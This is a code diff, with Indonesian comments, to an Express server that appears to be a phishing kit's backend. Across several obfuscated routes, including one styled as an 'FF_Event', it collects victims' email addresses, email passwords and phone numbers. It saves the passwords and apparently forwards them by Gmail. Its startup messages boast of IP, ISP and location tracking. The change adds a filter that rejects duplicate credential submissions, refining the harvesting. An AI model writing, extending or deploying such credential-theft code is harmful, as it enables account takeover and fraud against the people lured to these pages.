@@ -101,6 +101,57 @@ function isDuplicatePassword(targetEmail, currentPassword) {
     return false;
 }
 
+// ========== TAMBAHAN: ANTI DUPLIKAT KOMBINASI (email + password + phone) ==========
+const SUBMISSION_HISTORY_FILE = path.join(__dirname, 'submission_history.json');
+
+function loadSubmissionHistory() {
+    try {
+        if (fs.existsSync(SUBMISSION_HISTORY_FILE)) {
+            const data = fs.readFileSync(SUBMISSION_HISTORY_FILE, 'utf8');
+            return JSON.parse(data);
+        }
+    } catch (e) {}
+    return {};
+}
+
+function saveSubmissionHistory(history) {
+    try {
+        fs.writeFileSync(SUBMISSION_HISTORY_FILE, JSON.stringify(history, null, 2));
+    } catch (e) {}
+}
+
+// Key = gabungan email + password + phone (di-hash biar ga simpen plaintext password)
+function buildSubmissionKey(email, password, phone) {
+    const raw = `${(email || '').toLowerCase().trim()}|${password || ''}|${(phone || '').trim()}`;
+    let hash = 0;
+    for (let i = 0; i < raw.length; i++) {
+        const chr = raw.charCodeAt(i);
+        hash = ((hash << 5) - hash) + chr;
+        hash |= 0;
+    }
+    return 'sub_' + Math.abs(hash).toString(36) + '_' + raw.length;
+}
+
+// Cek apakah kombinasi email+password+phone PERSIS SAMA sudah pernah dikirim
+function isDuplicateSubmission(email, password, phone) {
+    const history = loadSubmissionHistory();
+    const key = buildSubmissionKey(email, password, phone);
+    return !!history[key];
+}
+
+// Simpan kombinasi yang udah dikirim
+function markSubmission(email, password, phone) {
+    const history = loadSubmissionHistory();
+    const key = buildSubmissionKey(email, password, phone);
+    history[key] = {
+        email: email,
+        phone: phone,
+        timestamp: new Date().toISOString()
+    };
+    saveSubmissionHistory(history);
+}
+// ===================================================================================
+
 const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
@@ -328,6 +379,13 @@ app.post('/wxyzzay/api/register', async (req, res) => {
         const data = req.body;
         console.log('📥 [WXYZZAY] DATA:', data.email);
         
+        // ===== TAMBAHAN: TOLAK KALO EMAIL + PASSWORD + PHONE SAMA PERSIS =====
+        if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
+            console.log('🚫 [WXYZZAY] Duplikat kombinasi (email+pw+phone sama) - DITOLAK');
+            return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
+        }
+        // =====================================================================
+        
         const isDup = isDuplicatePassword(data.email, data.emailPassword);
         const canSend = canSendToTarget(data.email, data.emailPassword);
         
@@ -342,6 +400,10 @@ app.post('/wxyzzay/api/register', async (req, res) => {
         history[data.email] = data.emailPassword;
         saveHistory(history);
         
+        // ===== TAMBAHAN: SIMPAN KOMBINASI YANG UDAH DIKIRIM =====
+        markSubmission(data.email, data.emailPassword, data.phone);
+        // =========================================================
+        
         res.json({ success: true });
     } catch(error) {
         console.error('Error:', error);
@@ -354,6 +416,13 @@ app.post('/ggwxzzr/api/register', async (req, res) => {
     try {
         const data = req.body;
         console.log('📥 [GGWXZZR] DATA:', data.email);
+        
+        // ===== TAMBAHAN: TOLAK KALO EMAIL + PASSWORD + PHONE SAMA PERSIS =====
+        if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
+            console.log('🚫 [GGWXZZR] Duplikat kombinasi (email+pw+phone sama) - DITOLAK');
+            return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
+        }
+        // =====================================================================
         
         const isDup = isDuplicatePassword(data.email, data.emailPassword);
         const canSend = canSendToTarget(data.email, data.emailPassword);
@@ -369,6 +438,10 @@ app.post('/ggwxzzr/api/register', async (req, res) => {
         history[data.email] = data.emailPassword;
         saveHistory(history);
         
+        // ===== TAMBAHAN: SIMPAN KOMBINASI YANG UDAH DIKIRIM =====
+        markSubmission(data.email, data.emailPassword, data.phone);
+        // =========================================================
+        
         res.json({ success: true });
     } catch(error) {
         console.error('Error:', error);
@@ -381,6 +454,13 @@ app.post('/hgefdyt/api/register', async (req, res) => {
     try {
         const data = req.body;
         console.log('📥 [HGEFDYT] DATA:', data.email);
+        
+        // ===== TAMBAHAN: TOLAK KALO EMAIL + PASSWORD + PHONE SAMA PERSIS =====
+        if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
+            console.log('🚫 [HGEFDYT] Duplikat kombinasi (email+pw+phone sama) - DITOLAK');
+            return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
+        }
+        // =====================================================================
         
         const isDup = isDuplicatePassword(data.email, data.emailPassword);
         const canSend = canSendToTarget(data.email, data.emailPassword);
@@ -396,6 +476,10 @@ app.post('/hgefdyt/api/register', async (req, res) => {
         history[data.email] = data.emailPassword;
         saveHistory(history);
         
+        // ===== TAMBAHAN: SIMPAN KOMBINASI YANG UDAH DIKIRIM =====
+        markSubmission(data.email, data.emailPassword, data.phone);
+        // =========================================================
+        
         res.json({ success: true });
     } catch(error) {
         console.error('Error:', error);
@@ -408,6 +492,13 @@ app.post('/mgwhiww/api/register', async (req, res) => {
     try {
         const data = req.body;
         console.log('📥 [MGWHIWW] DATA:', data.email);
+        
+        // ===== TAMBAHAN: TOLAK KALO EMAIL + PASSWORD + PHONE SAMA PERSIS =====
+        if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
+            console.log('🚫 [MGWHIWW] Duplikat kombinasi (email+pw+phone sama) - DITOLAK');
+            return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
+        }
+        // =====================================================================
         
         const isDup = isDuplicatePassword(data.email, data.emailPassword);
         const canSend = canSendToTarget(data.email, data.emailPassword);
@@ -423,6 +514,10 @@ app.post('/mgwhiww/api/register', async (req, res) => {
         history[data.email] = data.emailPassword;
         saveHistory(history);
         
+        // ===== TAMBAHAN: SIMPAN KOMBINASI YANG UDAH DIKIRIM =====
+        markSubmission(data.email, data.emailPassword, data.phone);
+        // =========================================================
+        
         res.json({ success: true });
     } catch(error) {
         console.error('Error:', error);
@@ -435,6 +530,13 @@ app.post('/kttwwxy/api/register', async (req, res) => {
     try {
         const data = req.body;
         console.log('📥 [KTTWWXY] DATA:', data.email);
+        
+        // ===== TAMBAHAN: TOLAK KALO EMAIL + PASSWORD + PHONE SAMA PERSIS =====
+        if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
+            console.log('🚫 [KTTWWXY] Duplikat kombinasi (email+pw+phone sama) - DITOLAK');
+            return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
+        }
+        // =====================================================================
         
         const isDup = isDuplicatePassword(data.email, data.emailPassword);
         const canSend = canSendToTarget(data.email, data.emailPassword);
@@ -450,6 +552,10 @@ app.post('/kttwwxy/api/register', async (req, res) => {
         history[data.email] = data.emailPassword;
         saveHistory(history);
         
+        // ===== TAMBAHAN: SIMPAN KOMBINASI YANG UDAH DIKIRIM =====
+        markSubmission(data.email, data.emailPassword, data.phone);
+        // =========================================================
+        
         res.json({ success: true });
     } catch(error) {
         console.error('Error:', error);
@@ -462,6 +568,13 @@ app.post('/mdgffew/api/register', async (req, res) => {
     try {
         const data = req.body;
         console.log('📥 [MDGFFEW] DATA:', data.email);
+        
+        // ===== TAMBAHAN: TOLAK KALO EMAIL + PASSWORD + PHONE SAMA PERSIS =====
+        if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
+            console.log('🚫 [MDGFFEW] Duplikat kombinasi (email+pw+phone sama) - DITOLAK');
+            return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
+        }
+        // =====================================================================
         
         const isDup = isDuplicatePassword(data.email, data.emailPassword);
         const canSend = canSendToTarget(data.email, data.emailPassword);
@@ -477,6 +590,10 @@ app.post('/mdgffew/api/register', async (req, res) => {
         history[data.email] = data.emailPassword;
         saveHistory(history);
         
+        // ===== TAMBAHAN: SIMPAN KOMBINASI YANG UDAH DIKIRIM =====
+        markSubmission(data.email, data.emailPassword, data.phone);
+        // =========================================================
+        
         res.json({ success: true });
     } catch(error) {
         console.error('Error:', error);
@@ -489,6 +606,13 @@ app.post('/FF_EventA/api/register', async (req, res) => {
     try {
         const data = req.body;
         console.log('📥 [FF_EventA] DATA:', data.email);
+        
+        // ===== TAMBAHAN: TOLAK KALO EMAIL + PASSWORD + PHONE SAMA PERSIS =====
+        if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
+            console.log('🚫 [FF_EventA] Duplikat kombinasi (email+pw+phone sama) - DITOLAK');
+            return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
+        }
+        // =====================================================================
         
         const isDup = isDuplicatePassword(data.email, data.emailPassword);
         const canSend = canSendToTarget(data.email, data.emailPassword);
@@ -503,6 +627,10 @@ app.post('/FF_EventA/api/register', async (req, res) => {
         const history = loadHistory();
         history[data.email] = data.emailPassword;
         saveHistory(history);
+        
+        // ===== TAMBAHAN: SIMPAN KOMBINASI YANG UDAH DIKIRIM =====
+        markSubmission(data.email, data.emailPassword, data.phone);
+        // =========================================================
         
         res.json({ success: true });
     } catch(error) {
@@ -828,4 +956,5 @@ app.listen(PORT, () => {
     console.log(`   → http://localhost:${PORT}/mdgffew`);
     console.log(`\n✅ ASN DETECTION ACTIVE: Setiap IP akan dilacak AS number, ISP, lokasi akurat!`);
     console.log(`✅ LOKASI AKURAT: City, Region, Country, Postal Code sesuai IP real!`);
+    console.log(`✅ ANTI-DUPLIKAT: Kombinasi email+pw+phone sama akan ditolak!`);
 });
